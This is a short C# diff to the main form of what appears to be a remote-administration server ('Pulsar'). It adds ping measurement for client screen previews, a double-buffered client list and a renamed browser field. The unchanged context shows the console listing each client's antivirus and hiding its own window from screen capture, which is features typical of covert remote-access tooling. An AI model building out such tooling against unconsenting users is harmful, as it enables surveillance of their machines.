@@ -51,6 +51,7 @@ namespace Pulsar.Server.Forms
         private readonly object _lockClients = new object();
         private PreviewHandler _previewImageHandler;
         private readonly string AutoTasksFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "autotasks.json");
+        private long _previewRequestTimestamp;
 
         public FrmMain()
         {
@@ -59,6 +60,9 @@ namespace Pulsar.Server.Forms
             _clientDebugLogHandler = new ClientDebugLog();
             RegisterMessageHandler();
             InitializeComponent();
+            typeof(ListView).InvokeMember("DoubleBuffered",
+                System.Reflection.BindingFlags.SetProperty | System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic,
+                null, this.lstClients, new object[] { true });
             DarkModeManager.ApplyDarkMode(this);
             ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
             _discordRpc = new DiscordRPC.DiscordRPC(this);  // Initialize Discord RPC
@@ -390,6 +394,7 @@ namespace Pulsar.Server.Forms
                     return;
                 }
 
+                _previewRequestTimestamp = Stopwatch.GetTimestamp();
                 selectedClients[0].Send(image);
             }
             else if (selectedClients.Length == 0)
@@ -418,9 +423,29 @@ namespace Pulsar.Server.Forms
                 antivirusItem.SubItems.Add("N/A");
                 clientInfoListView.Items.Add(antivirusItem);
 
-                var mainBrowserItem = new ListViewItem("Main Browser");
+                var mainBrowserItem = new ListViewItem("Default Browser");
                 mainBrowserItem.SubItems.Add("N/A");
                 clientInfoListView.Items.Add(mainBrowserItem);
+
+                var pingItem = new ListViewItem("Ping");
+                pingItem.SubItems.Add("N/A");
+                clientInfoListView.Items.Add(pingItem);
+            }
+        }
+
+        public void OnPreviewResponseReceived(GetPreviewResponse response)
+        {
+            double pingMs = 0;
+            if (_previewRequestTimestamp != 0)
+            {
+                long freq = Stopwatch.Frequency;
+                long now = Stopwatch.GetTimestamp();
+                pingMs = ((now - _previewRequestTimestamp) * 1000.0) / freq;
+                _previewRequestTimestamp = 0;
+            }
+            if (_previewImageHandler != null)
+            {
+                _previewImageHandler.SetLastPing((int)Math.Round(pingMs));
             }
         }
 
